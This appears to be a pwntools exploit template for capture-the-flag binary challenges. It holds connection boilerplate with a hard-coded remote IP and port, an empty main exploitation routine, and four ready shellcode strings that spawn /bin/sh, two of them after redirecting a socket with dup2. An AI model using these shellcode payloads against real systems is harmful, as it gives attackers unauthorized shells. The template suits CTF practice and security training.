from pwn import *
from enert import *

# =========================
# TEMPLATE FOR EXPLOITATION
# =========================
context(os="linux", arch="amd64")
context.log_level = "debug" # output verbose log
FILE_NAME   = "./a.out"
#REMOTE_LIBC = "./libc.so.6-hoge"
LOCAL_LIBC  = "/lib/x86_64-linux-gnu/libc.so.6"
REMOTE_HOST = "178.62.249.106"
REMOTE_PORT = 8642
LOCAL_HOST  = "localhost"
LOCAL_PORT  = 4444
binary      = ELF(FILE_NAME)
r           = None
dflg        = 0
if len(sys.argv) > 1 and sys.argv[1] == "r":
    r = remote(REMOTE_HOST, REMOTE_PORT)
    #libc = ELF(REMOTE_LIBC)
elif len(sys.argv) > 1 and sys.argv[1] == "l":
    r = process(FILE_NAME)
    libc = ELF(LOCAL_LIBC)
else:
    r = remote(LOCAL_HOST, LOCAL_PORT)
    libc = ELF(LOCAL_LIBC)

if len(sys.argv) > 1 and sys.argv[1] == "d":
    s = remote(LOCAL_HOST, LOCAL_PORT)
    f = open("gdbrc", "r")
    time.sleep(0.5)
    pid = proc.pid_by_name(BINARY)
    gdb.attach(pid[0], f)

def b():
    if dflg == 1:
        raw_input("break.")

sc_execve32 = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
sc_execve64 = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"
sc_dup2execve32 = "\x31\xd2\x31\xc9\x8d\x5a\x04\x8d\x42\x3f\xcd\x80\x41\x8d\x42\x3f\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
sc_dup2execve64 = "\x31\xd2\x31\xf6\x67\x8d\x7a\x04\x67\x8d\x42\x21\x0f\x05\xff\xc6\x67\x8d\x42\x21\x0f\x05\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"

# =========================
# MAIN EXPLOITATION ROUTINE
# =========================
